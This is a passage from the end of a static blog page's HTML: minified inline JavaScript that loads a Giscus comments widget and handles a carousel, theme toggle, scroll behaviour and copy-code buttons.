</a><script>function loadGiscus(e){document.querySelectorAll('.giscus-frame, script[src*="giscus.app"]').forEach(e=>e.remove());const t=document.createElement("script");t.src="https://giscus.app/client.js",t.setAttribute("data-repo","windshock/windshock.github.io"),t.setAttribute("data-repo-id","MDEwOlJlcG9zaXRvcnkxODQ2MDMyMTk="),t.setAttribute("data-category","General"),t.setAttribute("data-category-id","DIC_kwDOCwDSU84CoqLg"),t.setAttribute("data-mapping","pathname"),t.setAttribute("data-reactions-enabled","1"),t.setAttribute("data-theme",e),t.setAttribute("data-lang","en"),t.setAttribute("data-input-position","bottom"),t.setAttribute("data-loading","lazy"),t.crossOrigin="anonymous",t.async=!0,document.body.appendChild(t)}const currentTheme=document.body.classList.contains("dark")?"dark":"light";loadGiscus(currentTheme);const observer=new MutationObserver(()=>{const e=document.body.classList.contains("dark")?"dark":"light";loadGiscus(e)});observer.observe(document.body,{attributes:!0,attributeFilter:["class"]})</script><script>function initSwiperIfNeeded(){if(typeof Swiper=="undefined")return setTimeout(initSwiperIfNeeded,50);document.querySelector(".swiper")?(new Swiper(".swiper",{slidesPerView:1.2,spaceBetween:16,loop:!0,preloadImages:!1,lazy:{loadOnTransitionStart:!0,loadPrevNext:!0},pagination:{el:".swiper-pagination",clickable:!0},breakpoints:{768:{slidesPerView:2.5},1024:{slidesPerView:3.2}}}),document.querySelectorAll("img.swiper-lazy").forEach(e=>{e.src=e.dataset.src})):setTimeout(initSwiperIfNeeded,100)}initSwiperIfNeeded()</script><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>